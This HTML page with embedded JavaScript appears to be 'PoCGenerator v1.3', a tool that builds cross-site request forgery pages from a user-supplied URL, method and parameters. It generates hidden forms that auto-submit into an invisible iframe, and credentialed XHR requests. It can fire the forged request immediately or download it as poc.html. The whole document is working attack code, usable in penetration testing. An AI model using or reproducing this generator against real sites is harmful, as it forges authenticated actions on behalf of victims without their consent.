<!DOCTYPE html>

<html >
	<head>
		<meta charset="utf-8">
		<meta name="author" content="takubokudori">
		<meta name="description" content="Genrate CSRF PoC form">
		<link rel="author" href="https://github.com/takubokudori" />
		<title>PoC Generator</title>
	</head>
	<body>
<style>
.hide{
	visibility:hidden;
}
</style>
		<script>
			var form;

var formfunc={
	generate : function(){
		var ezhtml="";
		var req=getRequest();
		if(req===false)return;
		ezhtml+='<form target="dummyfrm" name="evilform" action="' + req['url'] + '" method="' + req['method'] + '" enctype="'+ req['enctype'] +'">\n';
		var params=req['params'];
		for(var i in params){
			ezhtml+='<input type="hidden" name="'+escapeHTML(URLdecode(params[i][0]))+'" value="'+escapeHTML(URLdecode(params[i][1]))+'" />\n';
		}
		ezhtml+='</form>\n';
		ezhtml+='<iframe src="x" width="1" height="1" name="dummyfrm" style="visibility:hidden"></iframe>';
		setEvilHTMLcontent(ezhtml);

		setEvilTextContent(ezhtml);
		errorMsg("");
	},

	generateHTML : function(title,bodyhtml){
		var content=getHTMLheader(title);
		content+='<body';
		if(isAutoSubmit()) content+=' onload="document.evilform.submit();"';
		content+='>\n';
		content+=bodyhtml;
		if(!isAutoSubmit()){
			content+='<button onclick="csrfSubmit();">submit</button>\n';
			content+='<sc'+'ript>\n';
			content+='function csrfSubmit(){\n';
			content+='var submit = HTMLFormElement.prototype["submit"].bind(document.evilform);\n';
			content+='submit();\n';
			content+='}\n';
			content+='</sc'+'ript>\n';
		}
		content+='\n<p>'+title+'</p>\n';
		content+='</body>\n';
		content+=getHTMLfooter();
		return content;
	},

	send : function(){
		var req=getRequest();
		document.getElementById("stat").innerHTML+="<p>Request sent.</p><p>"+escapeHTML(req['url'])+"</p><p>"+escapeHTML(req['params'])+"</p><hr />";
		var submit = HTMLFormElement.prototype["submit"].bind(document.evilform);
		submit();
	}

};

var xhrfunc={
	generate : function(){
		var req=getRequest();
		if(req===false)return;
		var ezhtml="";
		ezhtml+="function csrfXHR(){\n";
		ezhtml+="var xhr=new XMLHttpRequest();\n";
		ezhtml+="xhr.open('" + req['method'] + "','" + req['url'] + "');\n";
		ezhtml+="xhr.withCredentials = true;\n";
		ezhtml+="xhr.setRequestHeader('Content-Type','"+req['enctype']+";'";
		if(req['enctype']=="multipart/form-data")ezhtml+="+' boundary="+req['boundary']+"'";
		ezhtml+=");\n";
		ezhtml+="xhr.send('"+escapeJavascriptCRLF(getParamsRaw())+"');\n";
		ezhtml+="}\n";
		setEvilTextContent(ezhtml,true);
		setEvilHTMLcontent(ezhtml);
	},

	generateHTML : function(title,bodyhtml){
		var content=getHTMLheader(title);
		content+='<body';
		if(isAutoSubmit()) content+=' onload="csrfXHR();"';
		content+='>\n';
		content+=bodyhtml;
		if(!isAutoSubmit()) content+='<button onclick="csrfXHR();">submit</button>\n';
		content+='\n<p>'+title+'</p>\n';
		content+='</body>\n';
		content+=getHTMLfooter();
		return content;
	},

	send : function(){
		eval(document.getElementById("evilzone").textContent);
		csrfXHR();
	}
};

var func;

window.onload=function(){
	form=document.forms.messageForm;
	func=formfunc;
}
function URLencode(str){
	if(typeof str !== 'string') return str;
	return encodeURIComponent(str.replace(/\r?\n/g,"\r\n"));
}
function URLdecode(str){
	if(typeof str !== 'string') return str;
	return decodeURIComponent(str.replace(/\+/g,'%20'));
}

function escapeHTML(str) {
	if(typeof str !== 'string') return str;
	return str.replace(/[&'`"<>\n\r]/g, function(match) {
		return {
			'\r': '&#x0D',
			'\n': '&#x0A',
			'&': '&amp;',
			"'": '&#x27;',
			'`': '&#x60;',
			'"': '&quot;',
			'<': '&lt;',
			'>': '&gt;',
		}[match]
	});
}

function escapeJavascript(str){
	return str.replace(/['"\\\n\r]/g, function(match) {
		return {
			'\r': '\\r',
			'\n': '\\n',
			"'": '\\\'',
			'"': '\\\"',
			"\\": '\\\\',
		}[match]
	});
}

function escapeJavascriptCRLF(str){
	return str.replace(/[\n\r]/g, function(match) {
		return {
			'\r': '\\r',
			'\n': '\\n',
		}[match]
	});
}

function errorMsg(msg){
	if(typeof str === 'string') return msg;
	document.getElementById("errormsg").textContent=msg;
}

function setEvilHTMLcontent(ezhtml){
	document.getElementById("evilzone").innerHTML=ezhtml;

}

function setEvilTextContent(ezhtml,isScript=false){
	if(isScript) ezhtml="<"+"script>\n"+ezhtml+"</"+"script>\n";
	document.getElementById("nowhtml").textContent=ezhtml;
}

function triggerFunc(){
	var sm=form.sendmethod.value;
	eval('func='+sm+';');
}

function triggerEnctype(){
	var enctype=form.enctype.value;
	if(enctype=="multipart/form-data"){
		document.getElementById("div-boundary").style.visibility="visible";
	}else{
		document.getElementById("div-boundary").style.visibility="hidden";
	}
	if(enctype=="other"){
		document.getElementById("span-enctypeother").style.visibility="visible";
	}else{
		document.getElementById("span-enctypeother").style.visibility="hidden";
	}
}
function generatePoC(){
	func.generate();
}
function getRequest(){
	var url=getURL();
	if(url==""){
		errorMsg("URL is empty!");
		return false;
	}
	var method=getMethod();
	if(method==""){
		errorMsg("method is empty!");
		return false;
	}
	var enctype=getEnctype();
	if(enctype==""){
		errorMsg("enctype is empty!");
		return false;
	}
	var params=getParams();
	if(params==false){
		errorMsg("params is empty!");
		return false;
	}
	var boundary=form.boundary.value;
	return {
		'url':url,
		'method':method,
		'enctype':enctype,
		'params':params,
		'boundary':boundary
	};
}
function getURL(){
	return form.url.value;
}

function getMethod(){
	return form.method.value;
}

function getEnctype(){
	var et=form.enctype.value;
	if(et=="other") return form.enctypeother.value;
	return et;
}

function isAutoSubmit(){
	return form.autosubmit.checked;
}
function detectBoundary(){
	var pm=getParamsRaw();
	pm=pm.split(/\r\n|\n/);

	var k;
	for(var i = pm.length-1;i>=0;i--){
		k=pm[i].match(/^--[0-9a-zA-Z-]+--$/g);
		if(k!=null&&k.length===1){
			var z=k[0].slice(2,k.length-3);
			form.boundary.value=z;
			return;
		}
	}
	errorMsg("failed to detect boundary!Is params perfect format?");
	return;
}
function getParamsRaw(){
	return form.params.value;
}

function getParams(){
	var params=getParamsRaw();
	if(params=="")return false;
	var param=params.split("&");
	var dict=[];
	for(var i in param){
		var t=param[i].split("=");
		dict.push(t);
	}
	return dict;
}


function sendPoC(){
	func.send();
}


function executeDownload(name,content,mimeType){
	var blob = new Blob([content], {type : mimeType});

	var a = document.createElement('a');
	a.download = name;
	a.target   = '_blank';
	if (window.navigator.msSaveBlob) {
		window.navigator.msSaveBlob(blob, name)
	}
	else if (window.URL && window.URL.createObjectURL) {
		a.href = window.URL.createObjectURL(blob);
		document.body.appendChild(a);
		a.click();
		document.body.removeChild(a);
	}
	else if (window.webkitURL && window.webkitURL.createObject) {
		a.href = window.webkitURL.createObjectURL(blob);
		a.click();
	}
	else {
		window.open('data:' + mimeType + ';base64,' + window.Base64.encode(content), '_blank');
	}
}

function getHTMLheader(title="CSRF PoC"){
	var content='<!DOCTYPE html>\n\n';
	content+='<html>\n';
	content+='<head>\n';
	content+='<meta charset="utf-8">\n';
	content+='<title>'+title+'</title>\n';
	content+='</head>\n';
	return content;
}

function getHTMLfooter(){
	var content='</html>\n';
	return content;
}

function downloadHTML(){
	var nh=document.getElementById("nowhtml");
	if(nh.textContent==""){
		errorMsg("No downloadable HTML! generate form!");
		return;
	}
	var title=form.title.value;
	var content="";
	content=func.generateHTML(title,nh.textContent);
	var title=document.messageForm.title.value;

	var mimeType='text/plain';
	var name="poc.html";
	executeDownload(name,content,mimeType);
}
		</script>
		<h1>PoCGenerator v1.3</h1>

		<div>
			URLencode:<textarea id="uea" name="urlencodearea" rows="1" cols="60"></textarea>
			<button name="encodeIT" onclick="document.getElementById('uea').value=URLencode(document.getElementById('uea').value);return false;" >URL encode</button>
		</div>
		<hr>


		<span id="errormsg"></span>

		<form name="messageForm">
			<div>send :
			<input type="radio" name="sendmethod" id="use form" value="formfunc" onclick="triggerFunc();" checked><label for="use form">Form</label>
			<input type="radio" name="sendmethod" id="use xhr" value="xhrfunc" onclick="triggerFunc();"><label for="use xhr">XHR</label></div>
			<div>automatic submitting:<input type="checkbox" name="autosubmit" value="autosubmit" checked /></div>
			<div>URL:<input type="text" name="url" size="50" /></div>
			<div>method: <input type="text" name="method" size="8" value="POST" /></div>
			<div>enctype: <select name="enctype" onchange="triggerEnctype();">
				<option value="application/x-www-form-urlencoded" selected>application/x-www-form-urlencoded (default)</option>
				<option value="multipart/form-data">multipart/form-data</option>
				<option value="text/plain">text/plain</option>
				<option value="other">other</option>
				</select><span class="hide" id="span-enctypeother">other:<input type="text" name="enctypeother" size="20" value="" /></span></div>
				<div class="hide" id="div-boundary">boundary: <input type="text" name="boundary" size="20" value="" /><button onclick="detectBoundary();return false;">detect boundary</button></div>
				<div>params:<br />
			<textarea name="params" rows="6" cols="60" ></textarea><br />
			<button name="generate" onclick="generatePoC();sendPoC();return false;" >generate and submit</button>
			<button name="generate" onclick="generatePoC();return false;" >generate only</button></div>
				<div>title:<input type="text" name="title" size="20" value="CSRF PoC" />
					<button name="downloadhtml" onclick="generatePoC();downloadHTML();return false;" >download HTML</button></div>
		</form>
		<div id="evilzone" style="visibility:hidden"></div>
		<hr />
		<div id="nowhtml"></div>
		<hr />
		<p id="stat"></p>
	</body>
</html>
